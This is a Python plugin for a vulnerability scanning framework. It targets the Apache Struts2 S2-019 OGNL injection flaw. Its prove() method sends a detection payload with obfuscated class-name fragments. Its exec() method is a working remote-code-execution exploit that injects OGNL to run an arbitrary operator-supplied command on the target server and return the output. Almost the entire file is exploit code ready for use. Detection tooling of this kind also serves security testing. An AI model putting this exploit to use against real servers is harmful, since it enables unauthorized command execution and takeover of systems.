#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: 'orleven'

from lib.utils.connect import ClientSession
from lib.core.enums import VUL_LEVEL
from lib.core.enums import VUL_TYPE
from lib.core.enums import SERVICE_PORT_MAP
from script import Script, VUL_LEVEL, VUL_TYPE

class POC(Script):
    def __init__(self, target=None):
        self.service_type = SERVICE_PORT_MAP.WEB
        self.name = 'Struts2-019'
        self.keyword = ['struts2', 'java']
        self.info = 'Struts2-019'
        self.type = VUL_TYPE.RCE
        self.level = VUL_LEVEL.CRITICAL
        Script.__init__(self, target=target, service_type=self.service_type)

    async def prove(self):
        await self.get_url()
        if self.url != None:
            prove_poc = '''debug=command&expression=%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27),%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27),%23resp.setCharacterEncoding(%27UTF-8%27),%23resp.getWriter().print(%22struts2_security_%22),%23resp.getWriter().print(%22check%22),%23resp.getWriter().flush(),%23resp.getWriter().close()'''
            poc_key = "struts2_security_check"
            async with ClientSession() as session:
                headers = {'Content-Type': "application/x-www-form-urlencoded"}
                async with session.post(url=self.url, data=prove_poc, headers=headers) as res:
                    if res:
                        text = await res.text()
                        if poc_key in res.headers or poc_key in text:
                            self.flag = 1
                            self.req.append({"poc": prove_poc})
                            self.res.append({"info": self.url, "key": 'struts2_019'})


    async def exec(self):
        await self.get_url()
        if self.url != None:
            cmd = self.parameter['cmd']
            exec_poc =  '''debug=command&expression=%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27),%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27),%23resp.setCharacterEncoding(%27UTF-8%27),%23resp.getWriter().print(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%22%COMMAND%%22).getInputStream())),%23resp.getWriter().flush(),%23resp.getWriter().close()'''
            headers = {}
            async with ClientSession() as session:
                headers["Content-Type"] = "application/x-www-form-urlencoded"
                async with session.post(url=self.url, data=exec_poc.replace("%COMMAND%", cmd), headers=headers)as res:
                    if res:
                        text = await res.text()
                        self.flag = 1
                        self.req.append({"poc": exec_poc})
                        self.res.append({"info": text, "key": cmd})